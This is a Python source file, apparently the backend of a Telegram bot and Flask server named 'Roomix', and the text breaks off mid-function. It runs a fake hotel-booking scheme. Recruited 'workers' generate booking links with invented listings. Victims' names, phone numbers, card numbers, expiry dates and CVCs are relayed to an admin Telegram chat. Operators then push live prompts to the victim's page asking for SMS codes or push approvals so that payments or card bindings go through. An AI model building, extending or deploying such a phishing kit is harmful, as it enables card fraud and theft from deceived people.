import asyncio
import logging
import os
from dotenv import load_dotenv
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
import psycopg2
import datetime
import json
import time
import threading
from threading import Lock
from flask import Flask, Response, request, jsonify
import requests
import string
import random

# Загружаем переменные из .env
load_dotenv()

# Настройка логирования
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

BOT_TOKEN = os.getenv('BOT_TOKEN')
ADMIN_CHAT_ID = os.getenv('ADMIN_CHAT_ID')
SUPPORT_CHAT_ID = os.getenv('SUPPORT_CHAT_ID')

if not BOT_TOKEN or not ADMIN_CHAT_ID or not SUPPORT_CHAT_ID:
    logger.error("❌ BOT_TOKEN, ADMIN_CHAT_ID или SUPPORT_CHAT_ID не установлены!")
    exit(1)

ADMIN_CHAT_ID = int(ADMIN_CHAT_ID)
SUPPORT_CHAT_ID = int(SUPPORT_CHAT_ID)

bot = Bot(token=BOT_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(storage=storage)

# SSE сервер
app = Flask(__name__)
sse_clients = {}
sse_lock = Lock()

# Разрешенные домены для CORS
ALLOWED_ORIGINS = [
    "https://roomix.pw", 
    "http://localhost:3000",
    "http://127.0.0.1:5500", 
    "http://localhost:8080",
    "http://127.0.0.1:8080",
    "https://roomix-production.up.railway.app"
]

# CORS middleware
@app.after_request
def after_request(response):
    origin = request.headers.get('Origin')
    if origin in ALLOWED_ORIGINS:
        response.headers['Access-Control-Allow-Origin'] = origin
    response.headers['Access-Control-Allow-Headers'] = 'Content-Type, *'
    response.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS'
    response.headers['Access-Control-Allow-Credentials'] = 'true'
    return response

@app.route('/sse/<user_id>')
def sse(user_id):
    """Server-Sent Events endpoint для получения команд"""
    def event_stream():
        yield f"data: {json.dumps({'type': 'connected', 'message': 'SSE подключен'})}\n\n"
        
        with sse_lock:
            if user_id not in sse_clients:
                sse_clients[user_id] = []
            logger.info(f"✅ SSE подключен: {user_id}")
        
        try:
            while True:
                with sse_lock:
                    if user_id in sse_clients and sse_clients[user_id]:
                        while sse_clients[user_id]:
                            command = sse_clients[user_id].pop(0)
                            yield f"data: {json.dumps(command)}\n\n"
                
                time.sleep(0.05)
                
        except GeneratorExit:
            with sse_lock:
                if user_id in sse_clients:
                    del sse_clients[user_id]
                    logger.info(f"❌ SSE отключен: {user_id}")

    response = Response(event_stream(), mimetype='text/event-stream')
    origin = request.headers.get('Origin')
    if origin in ALLOWED_ORIGINS:
        response.headers['Access-Control-Allow-Origin'] = origin
    response.headers['Access-Control-Allow-Credentials'] = 'true'
    return response

@app.route('/check_card', methods=['POST', 'OPTIONS'])
def check_card():
    """Проверяет статус карты в БД"""
    if request.method == 'OPTIONS':
        response = jsonify({'status': 'ok'})
        origin = request.headers.get('Origin')
        if origin in ALLOWED_ORIGINS:
            response.headers['Access-Control-Allow-Origin'] = origin
        response.headers['Access-Control-Allow-Headers'] = 'Content-Type'
        response.headers['Access-Control-Allow-Methods'] = 'POST, OPTIONS'
        return response
        
    try:
        data = request.json
        card_number = data.get('card_number', '').replace(' ', '')
        
        if not card_number:
            return jsonify({'error': 'Missing card_number'}), 400
        
        # Проверяем карту в БД
        is_bound = check_card_in_db(card_number)
        
        response = jsonify({
            'status': 'success',
            'is_bound': is_bound,
            'card_status': 'ПРИВЯЗАННАЯ КАРТА' if is_bound else 'НЕПРИВЯЗАННАЯ КАРТА'
        })
        
        origin = request.headers.get('Origin')
        if origin in ALLOWED_ORIGINS:
            response.headers['Access-Control-Allow-Origin'] = origin
        return response
        
    except Exception as e:
        logger.error(f"❌ Ошибка проверки карты: {e}")
        response = jsonify({'error': str(e)})
        origin = request.headers.get('Origin')
        if origin in ALLOWED_ORIGINS:
            response.headers['Access-Control-Allow-Origin'] = origin
        return response, 500
        
@app.route('/send_to_telegram', methods=['POST', 'OPTIONS'])
def send_to_telegram():
    """Безопасная отправка данных в Telegram через сервер"""
    if request.method == 'OPTIONS':
        response = jsonify({'status': 'ok'})
        origin = request.headers.get('Origin')
        if origin in ALLOWED_ORIGINS:
            response.headers['Access-Control-Allow-Origin'] = origin
        response.headers['Access-Control-Allow-Headers'] = 'Content-Type'
        response.headers['Access-Control-Allow-Methods'] = 'POST, OPTIONS'
        return response
        
    try:
        data = request.json
        message_text = data.get('message')
        # Используем ADMIN_CHAT_ID из .env, а не из запроса
        chat_id = ADMIN_CHAT_ID
        parse_mode = data.get('parse_mode', 'HTML')
        reply_markup = data.get('reply_markup')
        
        if not message_text:
            return jsonify({'error': 'Missing message'}), 400
        
        # Отправляем сообщение через бота
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            'chat_id': chat_id,
            'text': message_text,
            'parse_mode': parse_mode
        }
        
        if reply_markup:
            payload['reply_markup'] = reply_markup
        
        response = requests.post(url, json=payload, timeout=10)
        result = response.json()
        
        if result.get('ok'):
            logger.info("✅ Сообщение отправлено в Telegram через сервер")
            response_data = {'status': 'success', 'message_id': result['result']['message_id']}
        else:
            logger.error(f"❌ Ошибка отправки в Telegram: {result}")
            response_data = {'status': 'error', 'error': result.get('description')}
        
        # CORS headers
        resp = jsonify(response_data)
        origin = request.headers.get('Origin')
        if origin in ALLOWED_ORIGINS:
            resp.headers['Access-Control-Allow-Origin'] = origin
        return resp
        
    except Exception as e:
        logger.error(f"💥 Ошибка отправки в Telegram: {e}")
        response = jsonify({'error': str(e)})
        origin = request.headers.get('Origin')
        if origin in ALLOWED_ORIGINS:
            response.headers['Access-Control-Allow-Origin'] = origin
        return response, 500

@app.route('/send_command', methods=['POST', 'OPTIONS'])
def send_command():
    """Бот отправляет команду пользователю"""
    if request.method == 'OPTIONS':
        response = jsonify({'status': 'ok'})
        origin = request.headers.get('Origin')
        if origin in ALLOWED_ORIGINS:
            response.headers['Access-Control-Allow-Origin'] = origin
        response.headers['Access-Control-Allow-Headers'] = 'Content-Type'
        response.headers['Access-Control-Allow-Methods'] = 'POST, OPTIONS'
        return response
        
    try:
        data = request.json
        user_id = data.get('user_id')
        action = data.get('action')
        payment_id = data.get('payment_id')
        
        if not user_id or not action:
            return {'error': 'Missing user_id or action'}, 400
            
        command_data = {
            'type': 'bot_command',
            'action': action,
            'payment_id': payment_id,
            'timestamp': datetime.datetime.now().isoformat()
        }
        
        with sse_lock:
            if user_id not in sse_clients:
                sse_clients[user_id] = []
            sse_clients[user_id].append(command_data)
            
        logger.info(f"✅ Команда отправлена {user_id}: {action}")
        response = jsonify({'status': 'success'})
        origin = request.headers.get('Origin')
        if origin in ALLOWED_ORIGINS:
            response.headers['Access-Control-Allow-Origin'] = origin
        return response
        
    except Exception as e:
        logger.error(f"❌ Ошибка отправки команды: {e}")
        response = jsonify({'error': str(e)})
        origin = request.headers.get('Origin')
        if origin in ALLOWED_ORIGINS:
            response.headers['Access-Control-Allow-Origin'] = origin
        return response, 500

@app.route('/health')
def health():
    """Проверка здоровья сервера"""
    with sse_lock:
        users_count = len(sse_clients)
        total_commands = sum(len(commands) for commands in sse_clients.values())
    
    response = jsonify({
        'status': 'running',
        'users_count': users_count,
        'total_commands': total_commands,
        'timestamp': datetime.datetime.now().isoformat(),
        'allowed_origins': ALLOWED_ORIGINS
    })
    origin = request.headers.get('Origin')
    if origin in ALLOWED_ORIGINS:
        response.headers['Access-Control-Allow-Origin'] = origin
    return response

@app.route('/get_link_data/<link_code>')
def get_link_data(link_code):
    """Получает данные ссылки по её коду"""
    try:
        logger.info(f"🔍 Поиск ссылки с кодом: {link_code}")
        
        conn = get_db_connection()
        if conn is None:
            logger.error("❌ Ошибка подключения к БД")
            return jsonify({'error': 'Database connection failed'}), 500
            
        cursor = conn.cursor()
        cursor.execute('''
            SELECT link_name, price, country_city, images 
            FROM booking_links 
            WHERE link_code = %s
        ''', (link_code,))
        
        result = cursor.fetchone()
        conn.close()
        
        if result:
            link_name, price, country_city, images_json = result
            logger.info(f"✅ Найдена ссылка: {link_name}, цена: {price}")
            
            # Обрабатываем изображения
            images = []
            if images_json:
                try:
                    # Если это JSON строка - парсим
                    if isinstance(images_json, str):
                        images = json.loads(images_json)
                    else:
                        images = images_json
                except Exception as e:
                    logger.error(f"❌ Ошибка парсинга images: {e}")
                    # Если не получается распарсить, используем как есть
                    images = [images_json] if images_json else []
            
            # Убедимся что images это список
            if not isinstance(images, list):
                images = [images] if images else []
            
            response_data = {
                'link_name': link_name,
                'price': int(price) if price else 450,
                'country_city': country_city or 'Польша, Варшава',
                'images': images,
                'description': 'Просторный номер премиум-класса с панорамным видом на город. В номере есть king-size кровать, рабочая зона, современная ванная комната с джакузи. Идеально подходит для романтического отдыха или деловой поездки.'
            }
            
            logger.info(f"📦 Отправляем данные: {response_data}")
            
            response = jsonify(response_data)
            
        else:
            logger.warning(f"❌ Ссылка не найдена: {link_code}")
            response = jsonify({'error': 'Link not found'}), 404
        
        # CORS headers
        origin = request.headers.get('Origin')
        if origin in ALLOWED_ORIGINS:
            response.headers['Access-Control-Allow-Origin'] = origin
        response.headers['Access-Control-Allow-Credentials'] = 'true'
        
        return response
            
    except Exception as e:
        logger.error(f"💥 Критическая ошибка получения данных ссылки: {e}")
        return jsonify({'error': f'Internal server error: {str(e)}'}), 500

# ★★★ НОВЫЕ ФУНКЦИИ ДЛЯ ТЕХПОДДЕРЖКИ ★★★

def save_chat_link_mapping(chat_user_id, link_code):
    """Сохраняет связь между user_id чата и кодом ссылки"""
    conn = get_db_connection()
    if conn is None:
        return False
        
    cursor = conn.cursor()
    try:
        cursor.execute('''
        INSERT INTO chat_link_mapping (chat_user_id, link_code) 
        VALUES (%s, %s)
        ON CONFLICT (chat_user_id) 
        DO UPDATE SET link_code = EXCLUDED.link_code
        ''', (chat_user_id, link_code))
        
        conn.commit()
        logger.info(f"✅ Связь сохранена: {chat_user_id} -> {link_code}")
        return True
    except Exception as e:
        logger.error(f"❌ Ошибка сохранения связи: {e}")
        return False
    finally:
        conn.close()

def get_link_code_by_chat_user(chat_user_id):
    """Получает код ссылки по user_id чата"""
    conn = get_db_connection()
    if conn is None:
        return None
        
    cursor = conn.cursor()
    try:
        cursor.execute('''
        SELECT link_code FROM chat_link_mapping 
        WHERE chat_user_id = %s
        ''', (chat_user_id,))
        
        result = cursor.fetchone()
        return result[0] if result else None
    except Exception as e:
        logger.error(f"❌ Ошибка получения связи: {e}")
        return None
    finally:
        conn.close()

def get_link_creator_info(chat_user_id):
    """Находит создателя ссылки по user_id чата"""
    try:
        # 1. Находим код ссылки по user_id чата
        link_code = get_link_code_by_chat_user(chat_user_id)
        
        if not link_code:
            logger.warning(f"❌ Не найдена ссылка для chat_user_id: {chat_user_id}")
            return f"ID: {chat_user_id}"
        
        logger.info(f"🔍 Найден link_code: {link_code} для chat_user_id: {chat_user_id}")
        
        # 2. Находим создателя ссылки по link_code
        conn = get_db_connection()
        if conn is None:
            return f"ID: {chat_user_id}"
            
        cursor = conn.cursor()
        
        # Ищем создателя ссылки
        cursor.execute('''
            SELECT bl.user_id, a.username 
            FROM booking_links bl
            LEFT JOIN applications a ON bl.user_id::text = a.user_id::text
            WHERE bl.link_code = %s
            LIMIT 1
        ''', (link_code,))
        
        result = cursor.fetchone()
        conn.close()
        
        if result:
            creator_user_id = result[0]
            creator_username = result[1]
            
            if creator_username:
                # Форматируем username
                if not creator_username.startswith('@'):
                    creator_username = f"@{creator_username}"
                logger.info(f"✅ Найден создатель: {creator_username}")
                return creator_username
            else:
                logger.info(f"ℹ️ Создатель найден по ID: {creator_user_id}")
                return f"ID: {creator_user_id}"
        else:
            logger.warning(f"❌ Создатель не найден для link_code: {link_code}")
            return f"ID: {chat_user_id}"
        
    except Exception as e:
        logger.error(f"❌ Ошибка поиска создателя: {e}")
        return f"ID: {chat_user_id}"

@app.route('/send_chat_message', methods=['POST', 'OPTIONS'])
def send_chat_message():
    """Клиент отправляет сообщение оператору"""
    if request.method == 'OPTIONS':
        return jsonify({'status': 'ok'}), 200
        
    try:
        data = request.json
        user_id = data.get('user_id')
        message = data.get('message')
        
        if not user_id or not message:
            return jsonify({'error': 'Missing user_id or message'}), 400
        
        # Сохраняем сообщение в БД
        conn = get_db_connection()
        if conn is None:
            return jsonify({'error': 'Database connection failed'}), 500
            
        cursor = conn.cursor()
        cursor.execute(
            'INSERT INTO chat_messages (user_id, message, sender) VALUES (%s, %s, %s)',
            (user_id, message, 'client')
        )
        conn.commit()
        conn.close()
        
        # НАХОДИМ КТО СОЗДАЛ ССЫЛКУ ПО USER_ID КЛИЕНТА
        creator_username = get_link_creator_info(user_id)
        logger.info(f"👤 Создатель ссылки: {creator_username} для клиента: {user_id}")

        # Отправляем сообщение в отдельный чат для SMS С КНОПКОЙ ОТВЕТА
        telegram_message = f"""💬 НОВОЕ СООБЩЕНИЕ

👤 От: {creator_username}
👥 Клиент: {user_id}
💬 Текст:
{message}"""

        # Создаем клавиатуру вручную в формате JSON
        reply_markup = {
            "inline_keyboard": [
                [{"text": "💬 Ответить", "callback_data": f"reply_sms:{user_id}"}]
            ]
        }

        # Используем существующую функцию отправки в Telegram
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            'chat_id': -1003473975732,  # ← ОТДЕЛЬНЫЙ ЧАТ ДЛЯ SMS
            'text': telegram_message,
            'parse_mode': 'HTML',
            'reply_markup': reply_markup  # ← ПЕРЕДАЕМ СЛОВАРЬ
        }
        
        # ОТПРАВЛЯЕМ СООБЩЕНИЕ!
        response = requests.post(url, json=payload, timeout=10)
        result = response.json()
        
        if result.get('ok'):
            logger.info(f"📤 SMS отправлено в чат с кнопкой ответа, message_id: {result['result']['message_id']}")
        else:
            logger.error(f"❌ Ошибка отправки SMS: {result}")
        
        logger.info(f"💬 Сообщение от {creator_username}: {message}")
        
        response = jsonify({'status': 'success'})
        origin = request.headers.get('Origin')
        if origin in ALLOWED_ORIGINS:
            response.headers['Access-Control-Allow-Origin'] = origin
        return response
        
    except Exception as e:
        logger.error(f"❌ Ошибка отправки сообщения чата: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/chat_history/<user_id>')
def chat_history(user_id):
    """Получить историю переписки"""
    try:
        conn = get_db_connection()
        if conn is None:
            return jsonify({'error': 'Database connection failed'}), 500
            
        cursor = conn.cursor()
        cursor.execute(
            'SELECT message, sender, created_at FROM chat_messages WHERE user_id = %s ORDER BY created_at ASC',
            (user_id,)
        )
        
        messages = []
        for row in cursor.fetchall():
            messages.append({
                'text': row[0],
                'sender': row[1],
                'time': row[2].isoformat() if row[2] else None
            })
        
        conn.close()
        
        response = jsonify({'messages': messages})
        origin = request.headers.get('Origin')
        if origin in ALLOWED_ORIGINS:
            response.headers['Access-Control-Allow-Origin'] = origin
        return response
        
    except Exception as e:
        logger.error(f"❌ Ошибка получения истории чата: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/operator_reply', methods=['POST', 'OPTIONS'])
def operator_reply():
    """Оператор отправляет сообщение клиенту через SSE"""
    if request.method == 'OPTIONS':
        return jsonify({'status': 'ok'}), 200
        
    try:
        data = request.json
        user_id = data.get('user_id')
        message = data.get('message')
        
        if not user_id or not message:
            return jsonify({'error': 'Missing user_id or message'}), 400
        
        # Сохраняем сообщение в БД
        conn = get_db_connection()
        if conn is None:
            return jsonify({'error': 'Database connection failed'}), 500
            
        cursor = conn.cursor()
        cursor.execute(
            'INSERT INTO chat_messages (user_id, message, sender) VALUES (%s, %s, %s)',
            (user_id, message, 'operator')
        )
        conn.commit()
        conn.close()
        
        # Отправляем клиенту через SSE (используем существующий механизм)
        command_data = {
            'type': 'chat_message',
            'action': 'operator_reply',
            'message': message,
            'timestamp': datetime.datetime.now().isoformat()
        }
        
        with sse_lock:
            if user_id not in sse_clients:
                sse_clients[user_id] = []
            sse_clients[user_id].append(command_data)
        
        logger.info(f"💬 Ответ оператора клиенту {user_id}: {message}")
        
        response = jsonify({'status': 'success'})
        origin = request.headers.get('Origin')
        if origin in ALLOWED_ORIGINS:
            response.headers['Access-Control-Allow-Origin'] = origin
        return response
        
    except Exception as e:
        logger.error(f"❌ Ошибка отправки ответа оператора: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/save_chat_mapping', methods=['POST', 'OPTIONS'])
def save_chat_mapping():
    """Сохраняет связь между user_id чата и кодом ссылки"""
    if request.method == 'OPTIONS':
        return jsonify({'status': 'ok'}), 200
        
    try:
        data = request.json
        chat_user_id = data.get('chat_user_id')
        link_code = data.get('link_code')
        
        if not chat_user_id or not link_code:
            return jsonify({'error': 'Missing chat_user_id or link_code'}), 400
        
        success = save_chat_link_mapping(chat_user_id, link_code)
        
        if success:
            response = jsonify({'status': 'success'})
        else:
            response = jsonify({'error': 'Failed to save mapping'}), 500
            
        origin = request.headers.get('Origin')
        if origin in ALLOWED_ORIGINS:
            response.headers['Access-Control-Allow-Origin'] = origin
        return response
        
    except Exception as e:
        logger.error(f"❌ Ошибка сохранения связи чата: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/')
def home():
    return "🚀 Roomix Bot + SSE Server"

def run_flask():
    """Запуск Flask сервера в отдельном потоке"""
    try:
        port = int(os.environ.get('PORT', 8080))
        logger.info(f"🌐 Flask запускается на порту: {port}")
        app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
    except Exception as e:
        logger.error(f"💥 Ошибка запуска Flask: {e}")

# Запускаем Flask в отдельном потоке
flask_thread = threading.Thread(target=run_flask, daemon=True)
flask_thread.start()

# ========== POSTGRESQL БАЗА ДАННЫХ ==========
def get_db_connection():
    """Подключение к PostgreSQL"""
    try:
        conn = psycopg2.connect(os.getenv('DATABASE_URL'))
        return conn
    except Exception as e:
        logger.error(f"❌ Ошибка подключения к БД: {e}")
        return None

def init_db():
    """Создание таблиц в PostgreSQL"""
    conn = get_db_connection()
    if conn is None:
        logger.error("❌ Не удалось подключиться к БД для инициализации")
        return
        
    cursor = conn.cursor()
    
    try:
        cursor.execute('''
        CREATE TABLE IF NOT EXISTS applications (
            id SERIAL PRIMARY KEY,
            user_id TEXT,
            username TEXT,
            first_name TEXT,
            time TEXT,
            experience TEXT,
            status TEXT DEFAULT 'pending',
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
        ''')
        
        cursor.execute('''
        CREATE TABLE IF NOT EXISTS payments (
            id SERIAL PRIMARY KEY,
            user_id TEXT,
            status TEXT DEFAULT 'pending',
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
        ''')
        
        # НОВАЯ ТАБЛИЦА ДЛЯ КАРТ
        cursor.execute('''
        CREATE TABLE IF NOT EXISTS cards (
            id SERIAL PRIMARY KEY,
            card_number TEXT UNIQUE,
            status TEXT DEFAULT 'active',
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
        ''')
        
        # НОВАЯ ТАБЛИЦА ДЛЯ ССЫЛОК БРОНИРОВАНИЯ
        cursor.execute('''
        CREATE TABLE IF NOT EXISTS booking_links (
            id SERIAL PRIMARY KEY,
            user_id TEXT,
            link_name TEXT,
            price INTEGER,
            country_city TEXT,
            images JSONB,
            link_code TEXT UNIQUE,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
        ''')
        
        # ★★★ НОВАЯ ТАБЛИЦА ДЛЯ ЧАТА ПОДДЕРЖКИ ★★★
        cursor.execute('''
        CREATE TABLE IF NOT EXISTS chat_messages (
            id SERIAL PRIMARY KEY,
            user_id TEXT,
            message TEXT,
            sender TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
        ''')
        
        # ★★★ НОВАЯ ТАБЛИЦА ДЛЯ СВЯЗИ ЧАТА И ССЫЛКИ ★★★
        cursor.execute('''
        CREATE TABLE IF NOT EXISTS chat_link_mapping (
            id SERIAL PRIMARY KEY,
            chat_user_id TEXT UNIQUE,
            link_code TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
        ''')
        
        conn.commit()
        logger.info("✅ Таблицы БД созданы/проверены + добавлена таблица связи чата")
    except Exception as e:
        logger.error(f"❌ Ошибка создания таблиц: {e}")
    finally:
        conn.close()

init_db()

class ApplicationStates(StatesGroup):
    waiting_for_time = State()
    waiting_for_experience = State()
    confirmation = State()
    
class LinkStates(StatesGroup):
    waiting_for_name = State()
    waiting_for_price = State()
    waiting_for_location = State()
    waiting_for_photos = State()
    confirmation = State()

# Кнопки для бота
main_kb = types.ReplyKeyboardMarkup(
    keyboard=[[types.KeyboardButton(text="📝 Оставить заявку")]],
    resize_keyboard=True
)

accepted_kb = types.ReplyKeyboardMarkup(
    keyboard=[[types.KeyboardButton(text="🏠 Главное меню")]],
    resize_keyboard=True
)

cancel_kb = types.ReplyKeyboardMarkup(
    keyboard=[[types.KeyboardButton(text="❌ Отменить заявку")]],
    resize_keyboard=True
)

confirm_kb = types.ReplyKeyboardMarkup(
    keyboard=[
        [types.KeyboardButton(text="✅ Отправить заявку")],
        [types.KeyboardButton(text="🔄 Заполнить заново")]
    ],
    resize_keyboard=True
)

# ========== ФУНКЦИИ ДЛЯ РАБОТЫ С КАРТАМИ ==========
def check_card_in_db(card_number):
    """Проверяет есть ли карта в БД"""
    conn = get_db_connection()
    if conn is None:
        return False
        
    cursor = conn.cursor()
    try:
        cursor.execute('SELECT id FROM cards WHERE card_number = %s', (card_number,))
        result = cursor.fetchone()
        return result is not None
    except Exception as e:
        logger.error(f"❌ Ошибка проверки карты: {e}")
        return False
    finally:
        conn.close()

def save_card_to_db(card_number):
    """Сохраняет карту в БД"""
    conn = get_db_connection()
    if conn is None:
        return False
        
    cursor = conn.cursor()
    try:
        cursor.execute('INSERT INTO cards (card_number) VALUES (%s) ON CONFLICT (card_number) DO NOTHING', (card_number,))
        conn.commit()
        logger.info(f"✅ Карта сохранена в БД: {card_number}")
        return True
    except Exception as e:
        logger.error(f"❌ Ошибка сохранения карты: {e}")
        return False
    finally:
        conn.close()

def extract_card_number(text):
    """Извлекает номер карты из текста сообщения"""
    try:
        lines = text.split('\n')
        for line in lines:
            if 'Номер:' in line:
                return line.split('Номер:')[1].strip()
        return None
    except Exception as e:
        logger.error(f"❌ Ошибка извлечения номера карты: {e}")
        return None

# Инлайн кнопки для платежей
def get_payment_buttons(payment_id, user_id="user123", card_number=None):
    buttons = [
        [
            InlineKeyboardButton(text="📱 SMS код", callback_data=f"sms:{payment_id}:{user_id}"),
            InlineKeyboardButton(text="🔔 Пуш", callback_data=f"push:{payment_id}:{user_id}")
        ],
        [
            InlineKeyboardButton(text="❌ Неверная карта", callback_data=f"wrong_card:{payment_id}:{user_id}"),
            InlineKeyboardButton(text="❌ Неверный SMS", callback_data=f"wrong_sms:{payment_id}:{user_id}")
        ],
        [
            InlineKeyboardButton(text="🔗 Привязать", callback_data=f"bind:{payment_id}:{user_id}")
        ]
    ]
    
    return InlineKeyboardMarkup(inline_keyboard=buttons)

# Инлайн кнопки для заявок
def get_admin_buttons(application_id):
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="✅ Принять", callback_data=f"accept_{application_id}"),
            InlineKeyboardButton(text="❌ Отклонить", callback_data=f"reject_{application_id}")
        ]
    ])

# ★★★ КНОПКА ОТВЕТА НА SMS ★★★

def get_sms_reply_button(user_id):
    """Создает кнопку для ответа на SMS"""
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💬 Ответить", callback_data=f"reply_sms:{user_id}")]
    ])

@dp.callback_query(F.data.startswith("reply_sms:"))
async def reply_sms_handler(callback: types.CallbackQuery, state: FSMContext):
    """Обработчик кнопки ответа на SMS"""
    user_id = callback.data.split(":")[1]
    
    # Сохраняем user_id для ответа
    await state.update_data(reply_user_id=user_id)  # ← БЫЛО update_state, ДОЛЖНО БЫТЬ update_data
    
    await callback.message.answer(
        f"💬 Ответ клиенту `{user_id}`\n\n"
        "Введите ваш ответ:",
        parse_mode="Markdown"
    )
    await callback.answer()
    
# Инлайн кнопки для бота
profile_kb = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="👤 Профиль", callback_data="profile")],
    [
        InlineKeyboardButton(text="🔗 Создать ссылку", callback_data="create_link"),
        InlineKeyboardButton(text="📋 Мои ссылки", callback_data="my_links")
    ]
])

# ========== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ДЛЯ ССЫЛОК ==========
def generate_link_code(length=8):
    """Генерирует уникальный код для ссылки"""
    characters = string.ascii_uppercase + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def save_booking_link(user_id, link_name, price, location, images, link_code):
    """Сохраняет ссылку бронирования в БД"""
    conn = get_db_connection()
    if conn is None:
        return False
        
    cursor = conn.cursor()
    try:
        cursor.execute('''
        INSERT INTO booking_links (user_id, link_name, price, country_city, images, link_code)
        VALUES (%s, %s, %s, %s, %s, %s)
        ''', (str(user_id), link_name, price, location, json.dumps(images), link_code))
        
        conn.commit()
        logger.info(f"✅ Ссылка создана: {link_code} для пользователя {user_id}")
        return True
    except Exception as e:
        logger.error(f"❌ Ошибка сохранения ссылки: {e}")
        return False
    finally:
        conn.close()

def get_user_links(user_id):
    """Получает все ссылки пользователя"""
    conn = get_db_connection()
    if conn is None:
        return []
        
    cursor = conn.cursor()
    try:
        cursor.execute('''
        SELECT link_name, price, country_city, link_code, created_at 
        FROM booking_links 
        WHERE user_id = %s 
        ORDER BY created_at DESC
        ''', (str(user_id),))
        
        links = []
        for row in cursor.fetchall():
            links.append({
                'name': row[0],
                'price': row[1],
                'location': row[2],
                'code': row[3],
                'created_at': row[4]
            })
        return links
    except Exception as e:
        logger.error(f"❌ Ошибка получения ссылок: {e}")
        return []
    finally:
        conn.close()

# ========== POSTGRESQL ФУНКЦИИ ==========
def get_user_status(user_id):
    conn = get_db_connection()
    if conn is None:
        return None
        
    cursor = conn.cursor()
    try:
        cursor.execute('SELECT status FROM applications WHERE user_id = %s ORDER BY id DESC LIMIT 1', (str(user_id),))
        result = cursor.fetchone()
        return result[0] if result else None
    except Exception as e:
        logger.error(f"❌ Ошибка получения статуса пользователя: {e}")
        return None
    finally:
        conn.close()

def get_join_date(user_id):
    conn = get_db_connection()
    if conn is None:
        return datetime.datetime.now().strftime('%d.%m.%Y')
        
    cursor = conn.cursor()
    try:
        cursor.execute('SELECT created_at FROM applications WHERE user_id = %s AND status = %s', (str(user_id), 'accepted'))
        result = cursor.fetchone()
        if result:
            return result[0].strftime('%d.%m.%Y')
        return datetime.datetime.now().strftime('%d.%m.%Y')
    except Exception as e:
        logger.error(f"❌ Ошибка получения даты вступления: {e}")
        return datetime.datetime.now().strftime('%d.%m.%Y')
    finally:
        conn.close()

def save_payment(user_id, first_name, last_name, email, phone, card_number, card_expiry, cvc):
    """СОХРАНЯЕМ ТОЛЬКО СТАТУС, БЕЗ ДАННЫХ КАРТ!"""
    try:
        conn = get_db_connection()
        if conn is None:
            return None
            
        cursor = conn.cursor()
        cursor.execute('''
        INSERT INTO payments (user_id, status)
        VALUES (%s, 'pending') RETURNING id
        ''', (str(user_id),))
        payment_id = cursor.fetchone()[0]
        conn.commit()
        conn.close()
        
        logger.info(f"✅ Платеж #{payment_id} создан (данные карт НЕ сохранены)")
        return payment_id
    except Exception as e:
        logger.error(f"❌ Ошибка создания платежа: {e}")
        return None

def save_application(user_id, username, first_name, time, experience):
    try:
        conn = get_db_connection()
        if conn is None:
            return None
            
        cursor = conn.cursor()
        cursor.execute('''
        INSERT INTO applications (user_id, username, first_name, time, experience, status)
        VALUES (%s, %s, %s, %s, %s, 'pending') RETURNING id
        ''', (str(user_id), username, first_name, time, experience))
        
        application_id = cursor.fetchone()[0]
        conn.commit()
        conn.close()
        return application_id
    except Exception as e:
        logger.error(f"❌ Ошибка сохранения заявки: {e}")
        return None

async def send_sse_command(user_id, action_type, payment_id=None):
    """Отправка команды через SSE сервер"""
    try:
        server_url = "https://roomix-production.up.railway.app"
        
        response = requests.post(
            f"{server_url}/send_command",
            json={
                'user_id': user_id,
                'action': action_type,
                'payment_id': payment_id
            },
            timeout=5
        )
        
        if response.status_code == 200:
            logger.info(f"✅ SSE команда отправлена {user_id}: {action_type}")
            return True
        else:
            logger.error(f"❌ Ошибка SSE отправки: {response.status_code}")
            return False
            
    except Exception as e:
        logger.error(f"💥 Ошибка HTTP запроса: {e}")
        return False

# ========== ОБЩАЯ ФУНКЦИЯ ДЛЯ СТАТУСОВ ПЛАТЕЖЕЙ ==========
async def update_payment_status(callback, payment_id, user_id, status_text, action_type, card_number=None):
    """Общая функция для обновления статуса платежа"""
    success = await send_sse_command(user_id, action_type, payment_id)
    
    # Если номер карты не передан, извлекаем из сообщения
    if not card_number:
        card_number = extract_card_number(callback.message.text)
    
    # Берем оригинальное сообщение с данными карты
    original_text = callback.message.text
    lines = original_text.split('\n')
    
    # Проверяем статус карты в БД
    card_status = "ПРИВЯЗАННАЯ КАРТА" if check_card_in_db(card_number) else "НЕПРИВЯЗАННАЯ КАРТА"
    
    # НАХОДИМ СОЗДАТЕЛЯ ССЫЛКИ
    creator_info = get_link_creator_info(user_id)
    
    # Собираем новое сообщение с красивым форматированием
    new_text = f"💳 <b>{card_status}</b>\n\n"
    new_text += f"👤 <b>Воркер:</b> {creator_info}\n\n"  # ← ДОБАВЛЯЕМ ВОРКЕРА
    
    # Добавляем клиентские данные
    for line in lines:
        if any(keyword in line for keyword in ['Имя:', 'Фамилия:', 'Email:', 'Телефон:']):
            new_text += line + "\n"
    
    new_text += "\n💳 <b>Карта:</b>\n"
    
    # Добавляем данные карты
    for line in lines:
